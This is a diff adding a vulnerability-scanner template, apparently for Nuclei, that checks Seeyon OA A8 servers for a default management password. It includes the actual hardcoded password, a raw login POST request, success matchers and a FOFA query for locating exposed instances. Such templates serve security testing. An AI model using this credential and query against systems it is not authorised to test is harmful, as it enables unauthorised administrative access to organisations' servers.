@@ -1,0 +1,32 @@
+id: seeyon-a8-management-default-login
+
+info:
+  name: 致远 OA A8 management/index.jsp - default login
+  author: pphua
+  severity: high
+  description: 
+  metadata:
+    verified: false
+    tips: 默认弱口令，存在信息泄露
+    fofa-query: title="致远A8-V5协同管理软件 V6.1sp1"
+  tags: seeyon,oa,default-login
+
+http:
+  - raw:
+      - |
+        POST /seeyon/management/index.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        password=WLCCYBD@SEEYON
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 302"
+
+      - type: word
+        part: header
+        words:
+          - "/seeyon/management/status.jsp"
